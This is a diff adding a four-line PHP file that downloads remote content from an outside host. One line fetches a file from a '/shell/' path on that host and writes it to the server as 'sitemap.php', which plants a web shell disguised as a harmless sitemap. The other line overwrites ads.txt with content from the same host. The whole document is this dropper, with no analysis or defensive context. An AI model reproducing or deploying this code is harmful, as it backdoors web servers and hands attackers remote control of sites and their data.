@@ -1,0 +1,4 @@
+<?php
+file_put_contents("ads.txt",file_get_contents('https://zsec.my.id/ads/ads.txt'));
+file_put_contents("sitemap.php",file_get_contents('https://zsec.my.id/shell/ets.txt'));
+?>
